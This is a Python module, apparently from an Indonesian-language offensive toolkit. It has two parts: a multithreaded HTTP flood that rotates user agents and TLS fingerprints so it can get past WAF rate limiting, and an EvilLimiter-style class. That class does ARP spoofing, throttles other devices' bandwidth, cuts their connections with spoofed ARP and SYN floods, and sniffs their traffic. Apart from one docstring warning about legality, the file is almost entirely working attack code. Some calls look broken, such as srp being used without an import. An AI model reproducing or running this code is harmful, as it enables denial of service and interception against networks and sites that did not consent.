import socket
import random
import threading
import time
import requests
import secrets
import subprocess
import re
import os
from typing import Dict, List, Optional, Tuple

# Scapy imports (optional - will fallback if not available)
try:
    from scapy.all import ARP, Ether, send, sr1, IP, TCP, UDP, ICMP, conf, sniff
    from scapy.layers.l2 import getmac
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

# Netifaces imports (optional - will fallback if not available)
try:
    import netifaces
    HAS_NETIFACES = True
except ImportError:
    HAS_NETIFACES = False

import struct

# * Modul Peralatan Keamanan Lanjutan
class SpecialTools:
    def __init__(self):
        self.isFlooding = False
        self.user_agents: List[str] = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15"
        ]
        self.referers: List[str] = [
            "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
            "https://www.reddit.com/", "https://twitter.com/", "https://www.facebook.com/",
            "https://t.co/", "https://github.com/", "https://stackoverflow.com/"
        ]
        self.stats: Dict[str, int] = {"success": 0, "blocked": 0, "error": 0, "redirect": 0}

    def detectHoneypot(self, target: str) -> bool:
        """Deteksi HoneyPot melalui pengukuran respons penundaan soket.
        
        Args:
            target: Alamat peladen IP/Domain sasaran.
            
        Returns:
            True jika terindikasi Honeypot berdasarkan respon yang lambat tak wajar.
        """
        start = time.time()
        try:
            socket.create_connection((target, 80), timeout=2)
            delay = time.time() - start
            return delay > 1.5
        except Exception:
            return False

    # * Alias untuk sinkronisasi dengan Core v6.3.1 (Apex "Nitro" Engine)
    def runNitroStress(self, targetUrl: str, duration: int = 15, threads: int = 50) -> str:
        """Menjalankan pengujian beban Nitro (Pembungkus HTTP Flood).
        
        Args:
            targetUrl: URL lengkap web yang diuji.
            duration: Durasi waktu detik.
            threads: Paralel pekerja utas jaringan.
            
        Returns:
            String konfirmasi inisialisasi uji beban Nitro.
        """
        return self.runHttpFlood(targetUrl, duration, threads)
        
    def runHttpFlood(self, targetUrl: str, duration: int = 15, threads: int = 50) -> str:
        """Menjalankan modul asinkron pengujian beban (HTTP Flood) pada aplikasi web dengan rotasi identitas.
        
        Args:
            targetUrl: URL lengkap web yang diuji.
            duration: Durasi waktu detik. 0 menandakan konstan tidak terbatas.
            threads: Paralel pekerja utas jaringan.
            
        Returns:
            String konfirmasi inisialisasi uji beban respon server.
        """
        if not targetUrl.startswith("http://") and not targetUrl.startswith("https://"):
            targetUrl = f"https://{targetUrl}"
            
        self.isFlooding = True
        self.stats = {"success": 0, "blocked": 0, "error": 0, "redirect": 0}
        print(f"[*] Evaluasi HTTP Flood ke {targetUrl} menggunakan {threads} pekerja.")

        def attack_worker():
            # * Batas waktu tidak terhingga jika nilai dimasukkan 0
            timeout = (time.time() + duration) if duration > 0 else (time.time() + 999999)
            
            try:
                import tls_client
                has_tls_client = True
            except ImportError:
                has_tls_client = False
                session = requests.Session()
                session.verify = False 
                import urllib3
                urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            
            # Profil TLS Client yang tersedia untuk merandom JA3 fingerprint
            tls_profiles = [
                "chrome_120", "chrome_119", "chrome_118", "chrome_117",
                "firefox_120", "firefox_119", "firefox_117",
                "safari_16_0", "safari_15_6_1", "opera_90", "opera_89"
            ]
            
            while time.time() < timeout and self.isFlooding:
                if hasattr(self, 'core') and self.core and getattr(self.core, 'stop_requested', False):
                    break
                    
                try:
                    # Variasi jeda yang nyata untuk membodohi rate limiter dinamis (WAF behavior profiling)
                    time.sleep(random.uniform(0.05, 0.2))
                    
                    if has_tls_client:
                        # Buat session TLS baru tiap request dengan fingerprint yang berbeda-beda
                        client_profile = random.choice(tls_profiles)
                        tls_session = tls_client.Session(
                            client_identifier=client_profile,
                            random_tls_extension_order=True
                        )
                        
                        user_agent = random.choice(self.user_agents)
                        is_chrome = "Chrome" in user_agent
                        
                        headers = {
                            'User-Agent': user_agent,
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' if is_chrome else 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                            'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7']),
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Connection': 'keep-alive',
                            'Upgrade-Insecure-Requests': '1',
                            'Sec-Fetch-Dest': 'document',
                            'Sec-Fetch-Mode': 'navigate',
                            'Sec-Fetch-Site': random.choice(['none', 'cross-site']),
                            'Sec-Fetch-User': '?1',
                            'Cache-Control': random.choice(['max-age=0', 'no-cache']),
                            'Referer': random.choice(self.referers) if random.random() > 0.3 else ''
                        }
                        # Menghapus elemen kosong (contoh Referer kosong)
                        headers = {k: v for k, v in headers.items() if v}
                        
                        resp = tls_session.get(targetUrl, headers=headers, timeout_seconds=8, allow_redirects=True)
                        
                    else:
                        # Fallback ke request biasa jika tls_client tidak terinstall
                        user_agent = random.choice(self.user_agents)
                        is_chrome = "Chrome" in user_agent
                        
                        headers = {
                            'User-Agent': user_agent,
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' if is_chrome else 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                            'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7']),
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Connection': 'keep-alive',
                            'Upgrade-Insecure-Requests': '1',
                            'Sec-Fetch-Dest': 'document',
                            'Sec-Fetch-Mode': 'navigate',
                            'Sec-Fetch-Site': random.choice(['none', 'cross-site']),
                            'Sec-Fetch-User': '?1',
                            'Cache-Control': random.choice(['max-age=0', 'no-cache']),
                            'Referer': random.choice(self.referers) if random.random() > 0.3 else ''
                        }
                        headers = {k: v for k, v in headers.items() if v}
                        
                        resp = session.get(targetUrl, headers=headers, timeout=8, allow_redirects=True)
                    
                    
                    code = resp.status_code
                    if code == 200: self.stats["success"] += 1
                    elif code == 403 or code == 429: self.stats["blocked"] += 1
                    elif 300 <= code < 400: self.stats["redirect"] += 1
                    else: self.stats["error"] += 1
                    
                except Exception:
                    self.stats["error"] += 1

        workers = []
        for _ in range(threads):
            t = threading.Thread(target=attack_worker, daemon=True)
            t.start()
            workers.append(t)
            
        return f"Pengujian beban asinkron HTTP Flood dijalankan {duration} detik."

    def stopActiveTasks(self) -> str:
        """Hentikan paksa seluruh lalu lintas uji beban."""
        self.isFlooding = False
        return "Penghentian pengerjaan beban berhasil disebarkan ke pekerja utas."

    def dnsStressTest(self, target: str) -> str:
        """Menjalankan pengujian resolusi DNS acak.
        
        Args:
            target: Sistem pemetaan rute target.
            
        Returns:
            String log sukses / gagal.
        """
        try:
            for i in range(5):
                socket.gethostbyname(f"v-domain-{random.randint(1,999)}.{target}")
            return "Pencarian jejak asinkron rute sub-DNS dirampungkan."
        except Exception as e:
            return f"DNS Error: {str(e)}"


# ========== EVILLIMITER-STYLE NETWORK CONTROL (v6.3) ==========

class EvilLimiter:
    """
    EvilLimiter itu kayak 'polisi lalu lintas' jahat buat jaringan WiFi!
    
    🎯 APA TUJUANNYA?
    
    Tool ini bisa NGONTROL device lain yang connect ke WiFi yang sama:
    - Limit bandwidth (buat internetan lemot)
    - Putus koneksi (buat dia disconnect dari WiFi)
    - Monitor traffic (intip data yang lalu-lalang)
    
    ⚙️ CARA KERJANYA?
    
    1. ARP SPOOFING - Jadi 'perantara' jahat
       - Normalnya: HP → Router → Internet
       - Setelah di-spoof: HP → KOMPUTER LU → Router → Internet
       - Sekarang lu di tengah-tengah (Man-in-the-Middle!)
    
    2. BANDWIDTH LIMITING - Kasih 'rem' ke target
       - Upload dibatesin (misal: cuma 5kbit/detik)
       - Download dibatesin (misal: cuma 10kbit/detik)
       - Target bakal ngerasa internetan super lemot
    
    3. CONNECTION KILLER - Putusin koneksi
       - ARP method: Banjirin target ARP response palsu
       - SYN method: Spam port target sampe error
       - Target: "Kok WiFi-nya disconnect terus ya?"
    
    4. TRAFFIC MONITORING - Intip lalu-lalang data
       - Hitung jumlah packet
       - Liat berapa bytes yang lewat
       - Deteksi HTTP vs HTTPS traffic
    
    📱 COMMAND DI APEXOMEGA:
    
    !scanlan                      - Scan WiFi, liat siapa aja yang connect
    !evil 192.168.1.100 10kbit    - Limit bandwidth target
    !kill 192.168.1.100           - Putusin koneksi target
    !monitor 192.168.1.100 30     - Monitor traffic 30 detik
    
    ⚠️ PERINGATAN KERAS:
    
    - HANYA pake di jaringan LU SENDIRI!
    - Atau jaringan yang ADA IJIN TERTULIS dari pemilik
    - Pake di WiFi orang lain = ILEGAL (UU ITE!)
    - Bisa kena pasal hacking & unauthorized access
    
    💡 CONTOH PENGGUNAAN LEGAL:
    
    - Test jaringan WiFi sendiri
    - Audit keamanan jaringan klien (dengan kontrak)
    - Edukasi & pembelajaran di lab sendiri
    - Bug bounty program yang resmi
    
    "Just because you CAN, doesn't mean you SHOULD!"
    """
    
    def __init__(self):
        self.is_active = False
        self.targets: List[Dict] = []
        self.gateway_ip: Optional[str] = None
        self.gateway_mac: Optional[str] = None
        self.interface: Optional[str] = None
        self.arp_threads: List[threading.Thread] = []
        self.tc_rules: List[str] = []
        self.original_bw: Dict[str, str] = {}
        
    # ========== NETWORK DISCOVERY ==========
    
    def get_network_info(self) -> Dict[str, str]:
        """Dapatkan info jaringan lokal (gateway, interface, IP)."""
        info = {
            'gateway': None,
            'interface': None,
            'local_ip': None
        }
        
        # Try netifaces first
        if HAS_NETIFACES:
            try:
                gateways = netifaces.gateways()
                if 'default' in gateways and netifaces.AF_INET in gateways['default']:
                    info['gateway'] = gateways['default'][netifaces.AF_INET][0]
                    info['interface'] = gateways['default'][netifaces.AF_INET][1]
                
                if info['interface']:
                    addrs = netifaces.ifaddresses(info['interface'])
                    if netifaces.AF_INET in addrs:
                        info['local_ip'] = addrs[netifaces.AF_INET][0]['addr']
                    return info
            except Exception:
                pass
        
        # Fallback: Windows command
        try:
            result = subprocess.run(['ipconfig'], capture_output=True, text=True, timeout=10)
            output = result.stdout
            
            # Find default gateway
            for line in output.split('\n'):
                if 'Default Gateway' in line or 'Gateway Default' in line:
                    match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                    if match:
                        info['gateway'] = match.group(1)
                        break
            
            # Find IPv4 address
            for line in output.split('\n'):
                if 'IPv4' in line or 'Alamat IPv4' in line:
                    match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                    if match:
                        info['local_ip'] = match.group(1)
                        break
            
            # Determine interface from IP
            if info['local_ip']:
                if info['local_ip'].startswith('192.168.1'):
                    info['interface'] = 'Wi-Fi'
                elif info['local_ip'].startswith('192.168.0'):
                    info['interface'] = 'Wi-Fi'
                else:
                    info['interface'] = 'Ethernet'
                    
        except Exception:
            pass
        
        # Ultimate fallback
        if not info['local_ip']:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                info['local_ip'] = s.getsockname()[0]
                s.close()
                
                # Try common gateway IPs
                base = info['local_ip'].rsplit('.', 1)[0]
                for gw in [f"{base}.1", "192.168.1.1", "192.168.0.1", "10.0.0.1"]:
                    info['gateway'] = gw
                    break
                    
                info['interface'] = 'Unknown'
            except Exception:
                pass
        
        return info
    
    def scan_network(self, target_ip: Optional[str] = None) -> List[Dict]:
        """
        Scan jaringan untuk menemukan device yang terhubung.
        
        Args:
            target_ip: IP spesifik atau range (contoh: "192.168.1.0/24")
        
        Returns:
            List device dengan info {ip, mac, hostname}
        """
        devices = []
        
        if not HAS_SCAPY:
            # Fallback to nmap scan only
            net_info = self.get_network_info()
            base_ip = target_ip or net_info.get('gateway', '192.168.1.1')
            base = base_ip.rsplit('.', 1)[0]
            network = f"{base}.0/24"
            return self._nmap_scan(network)
        
        try:
            # Get network info
            net_info = self.get_network_info()
            base_ip = target_ip or net_info.get('gateway', '192.168.1.1')
            
            # Extract network range
            if '/' in base_ip:
                network = base_ip
            else:
                base = base_ip.rsplit('.', 1)[0]
                network = f"{base}.0/24"
            
            # ARP scan menggunakan scapy
            conf.verb = 0  # Disable verbose
            
            arp_request = ARP(pdst=network)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast / arp_request
            
            # Send and receive responses
            answered_list = srp(packet, timeout=2, retry=2)[0]
            
            for sent, received in answered_list:
                if received.hwsrc:
                    device = {
                        'ip': received.psrc,
                        'mac': received.hwsrc.upper(),
                        'hostname': self._resolve_hostname(received.psrc)
                    }
                    devices.append(device)
                    
        except Exception as e:
            # Fallback: try nmap if available
            try:
                devices = self._nmap_scan(network if '/' in network else f"{network}/24")
            except Exception:
                pass
        
        return devices
    
    def _nmap_scan(self, network: str) -> List[Dict]:
        """Fallback scan menggunakan nmap."""
        devices = []
        try:
            result = subprocess.run(
                ["nmap", "-sn", network],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            # Parse nmap output
            ip_pattern = r"Nmap scan report for ([\w\.\-]+)"
            mac_pattern = r"MAC Address: ([A-F0-9:]+)"
            
            current_ip = ""
            for line in result.stdout.split('\n'):
                ip_match = re.search(ip_pattern, line)
                if ip_match:
                    current_ip = ip_match.group(1)
                
                mac_match = re.search(mac_pattern, line)
                if mac_match and current_ip:
                    devices.append({
                        'ip': current_ip,
                        'mac': mac_match.group(1).upper(),
                        'hostname': current_ip
                    })
                    current_ip = ""
                    
        except Exception:
            pass
        
        return devices
    
    def _resolve_hostname(self, ip: str) -> str:
        """Resolve hostname dari IP."""
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            return hostname.split('.')[0]
        except Exception:
            return ip
    
    def get_gateway_mac(self, gateway_ip: str) -> Optional[str]:
        """Dapatkan MAC address gateway."""
        try:
            arp_response = sr1(
                ARP(pdst=gateway_ip) / Ether(dst="ff:ff:ff:ff:ff:ff"),
                timeout=2,
                verbose=0
            )
            if arp_response:
                return arp_response[Ether].src.upper()
        except Exception:
            pass
        return None
    
    # ========== ARP SPOOFING ==========
    
    def start_arp_spoof(self, target_ip: str, gateway_ip: str) -> bool:
        """
        Mulai ARP spoofing ke target.
        
        Args:
            target_ip: IP target yang akan di-spoof
            gateway_ip: IP gateway
        
        Returns:
            True jika berhasil mulai
        """
        try:
            target_mac = getmac(target_ip)
            gateway_mac = getmac(gateway_ip)
            
            if not target_mac or not gateway_mac:
                return False
            
            self.is_active = True
            
            # Thread untuk spoof target (bilang ke target kalau kita adalah gateway)
            def spoof_target():
                while self.is_active:
                    send(
                        ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip),
                        verbose=0,
                        inter=2
                    )
            
            # Thread untuk spoof gateway (bilang ke gateway kalau kita adalah target)
            def spoof_gateway():
                while self.is_active:
                    send(
                        ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip),
                        verbose=0,
                        inter=2
                    )
            
            t1 = threading.Thread(target=spoof_target, daemon=True)
            t2 = threading.Thread(target=spoof_gateway, daemon=True)
            
            t1.start()
            t2.start()
            
            self.arp_threads.extend([t1, t2])
            
            return True
            
        except Exception as e:
            return False
    
    def stop_arp_spoof(self) -> str:
        """Hentikan ARP spoofing dan restore ARP table."""
        self.is_active = False
        
        # Restore ARP table untuk semua target
        for target in self.targets:
            try:
                # Kirim ARP response asli untuk restore
                send(
                    ARP(op=2, pdst=target['ip'], hwdst=target['mac'], psrc=self.gateway_ip),
                    verbose=0,
                    count=3
                )
                send(
                    ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=target['ip']),
                    verbose=0,
                    count=3
                )
            except Exception:
                pass
        
        # Clear threads
        self.arp_threads.clear()
        
        return "ARP spoofing stopped and tables restored"
    
    # ========== BANDWIDTH LIMITING ==========
    
    def limit_bandwidth(self, target_ip: str, upload_limit: str = "10kbit", 
                       download_limit: str = "10kbit") -> bool:
        """
        Limit bandwidth target menggunakan tc (traffic control).
        
        Args:
            target_ip: IP target
            upload_limit: Upload speed limit (contoh: "10kbit", "1mbit")
            download_limit: Download speed limit
        
        Returns:
            True jika berhasil
        """
        if not self.interface:
            net_info = self.get_network_info()
            self.interface = net_info.get('interface')
        
        if not self.interface:
            return False
        
        try:
            # Clear existing rules
            subprocess.run(
                ["tc", "qdisc", "del", "dev", self.interface, "root"],
                capture_output=True
            )
            
            # Add root qdisc
            subprocess.run(
                ["tc", "qdisc", "add", "dev", self.interface, "root", "handle", "1:", "htb"],
                capture_output=True
            )
            
            # Add class for target with limit
            subprocess.run(
                ["tc", "class", "add", "dev", self.interface, "parent", "1:", 
                 "classid", "1:1", "htb", "rate", download_limit],
                capture_output=True
            )
            
            # Filter untuk target IP (download)
            subprocess.run(
                ["tc", "filter", "add", "dev", self.interface, "protocol", "ip",
                 "parent", "1:0", "prio", "1", "u32", "match", "ip", "dst", target_ip,
                 "flowid", "1:1"],
                capture_output=True
            )
            
            # Upload limit (direction reversed)
            subprocess.run(
                ["tc", "class", "add", "dev", self.interface, "parent", "1:", 
                 "classid", "1:2", "htb", "rate", upload_limit],
                capture_output=True
            )
            
            subprocess.run(
                ["tc", "filter", "add", "dev", self.interface, "protocol", "ip",
                 "parent", "1:0", "prio", "1", "u32", "match", "ip", "src", target_ip,
                 "flowid", "1:2"],
                capture_output=True
            )
            
            self.tc_rules.append(target_ip)
            return True
            
        except Exception as e:
            return False
    
    def remove_bandwidth_limit(self, target_ip: str) -> bool:
        """Remove bandwidth limit untuk target spesifik."""
        try:
            # Clear semua tc rules
            subprocess.run(
                ["tc", "qdisc", "del", "dev", self.interface, "root"],
                capture_output=True
            )
            
            if target_ip in self.tc_rules:
                self.tc_rules.remove(target_ip)
            
            return True
        except Exception:
            return False
    
    def remove_all_limits(self) -> str:
        """Hapus semua bandwidth limit."""
        try:
            subprocess.run(
                ["tc", "qdisc", "del", "dev", self.interface, "root"],
                capture_output=True
            )
            self.tc_rules.clear()
            return "All bandwidth limits removed"
        except Exception:
            return "Failed to remove limits"
    
    # ========== CONNECTION KILLER ==========
    
    def kill_connection(self, target_ip: str, method: str = "arp") -> bool:
        """
        Putus koneksi target dari jaringan.
        
        Args:
            target_ip: IP target
            method: "arp" (ARP spoof) atau "syn" (SYN flood)
        
        Returns:
            True jika berhasil
        """
        if method == "arp":
            return self._kill_arp(target_ip)
        elif method == "syn":
            return self._kill_syn(target_ip)
        return False
    
    def _kill_arp(self, target_ip: str) -> bool:
        """Kill connection menggunakan ARP spoofing continuous."""
        try:
            target_mac = getmac(target_ip)
            gateway_mac = getmac(self.gateway_ip) if self.gateway_ip else None
            
            if not target_mac:
                return False
            
            # Continuous ARP spoof dengan invalid MAC
            def continuous_spoof():
                for _ in range(10):  # 10 packets
                    send(
                        ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                            psrc=self.gateway_ip, hwsrc="00:00:00:00:00:00"),
                        verbose=0,
                        inter=0.5
                    )
                    if gateway_mac:
                        send(
                            ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac,
                                psrc=target_ip, hwsrc="00:00:00:00:00:00"),
                            verbose=0,
                            inter=0.5
                        )
            
            thread = threading.Thread(target=continuous_spoof, daemon=True)
            thread.start()
            return True
            
        except Exception:
            return False
    
    def _kill_syn(self, target_ip: str) -> bool:
        """Kill connection menggunakan SYN flood ke open ports."""
        try:
            # Scan common ports
            common_ports = [21, 22, 23, 80, 443, 8080, 3389, 445]
            
            for port in common_ports:
                # Send SYN packet dengan source IP palsu
                ip = IP(dst=target_ip)
                tcp = TCP(sport=random.randint(1024, 65535), dport=port, flags="S")
                send(ip/tcp, verbose=0, count=5)
            
            return True
        except Exception:
            return False
    
    # ========== TRAFFIC MONITORING ==========
    
    def monitor_traffic(self, target_ip: Optional[str] = None, 
                       duration: int = 10) -> Dict[str, any]:
        """
        Monitor traffic jaringan.
        
        Args:
            target_ip: IP target spesifik (None untuk semua)
            duration: Durasi monitoring dalam detik
        
        Returns:
            Dict dengan statistik traffic
        """
        stats = {
            'packets': 0,
            'bytes': 0,
            'tcp': 0,
            'udp': 0,
            'icmp': 0,
            'http': 0,
            'https': 0,
            'error': 'Scapy not available' if not HAS_SCAPY else ''
        }
        
        if not HAS_SCAPY:
            return stats
        
        def packet_callback(packet):
            stats['packets'] += 1
            stats['bytes'] += len(packet)
            
            if TCP in packet:
                stats['tcp'] += 1
                if packet[TCP].dport in [80, 8080]:
                    stats['http'] += 1
                elif packet[TCP].dport == 443:
                    stats['https'] += 1
            elif UDP in packet:
                stats['udp'] += 1
            elif ICMP in packet:
                stats['icmp'] += 1
        
        try:
            # Sniff packets
            if target_ip:
                sniff(filter=f"host {target_ip}", prn=packet_callback, 
                     timeout=duration, store=False)
            else:
                sniff(prn=packet_callback, timeout=duration, store=False)
        except Exception:
            pass
        
        return stats
    
    # ========== MAIN CONTROL FUNCTIONS ==========
    
    def start_attack(self, target_ip: str, gateway_ip: Optional[str] = None,
                    limit_upload: str = "5kbit", limit_download: str = "5kbit") -> Dict:
        """
        Mulai serangan lengkap: ARP spoof + bandwidth limit.
        
        Args:
            target_ip: IP target
            gateway_ip: IP gateway (auto-detect jika None)
            limit_upload: Upload limit
            limit_download: Download limit
        
        Returns:
            Dict status operasi
        """
        result = {
            'success': False,
            'arp_spoof': False,
            'bandwidth_limit': False,
            'message': ''
        }
        
        # Auto-detect gateway
        if not gateway_ip:
            net_info = self.get_network_info()
            gateway_ip = net_info.get('gateway')
            self.gateway_ip = gateway_ip
        
        if not gateway_ip:
            result['message'] = "Gateway not found"
            return result
        
        # Get gateway MAC
        self.gateway_mac = self.get_gateway_mac(gateway_ip)
        self.gateway_ip = gateway_ip
        
        # Start ARP spoof
        if self.start_arp_spoof(target_ip, gateway_ip):
            result['arp_spoof'] = True
            result['message'] = "ARP spoofing started"
        else:
            result['message'] = "Failed to start ARP spoofing"
            return result
        
        # Apply bandwidth limit
        if self.limit_bandwidth(target_ip, limit_upload, limit_download):
            result['bandwidth_limit'] = True
            result['message'] += " + bandwidth limited"
        
        # Add to targets list
        self.targets.append({
            'ip': target_ip,
            'gateway': gateway_ip,
            'upload_limit': limit_upload,
            'download_limit': limit_download
        })
        
        result['success'] = True
        return result
    
    def stop_attack(self, target_ip: Optional[str] = None) -> str:
        """
        Hentikan serangan.
        
        Args:
            target_ip: IP target spesifik (None untuk semua)
        
        Returns:
            Status message
        """
        if target_ip:
            # Stop specific target
            self.remove_bandwidth_limit(target_ip)
            self.targets = [t for t in self.targets if t['ip'] != target_ip]
            
            if not self.targets:
                self.stop_arp_spoof()
            
            return f"Attack stopped for {target_ip}"
        else:
            # Stop all
            self.remove_all_limits()
            self.stop_arp_spoof()
            self.targets.clear()
            return "All attacks stopped"
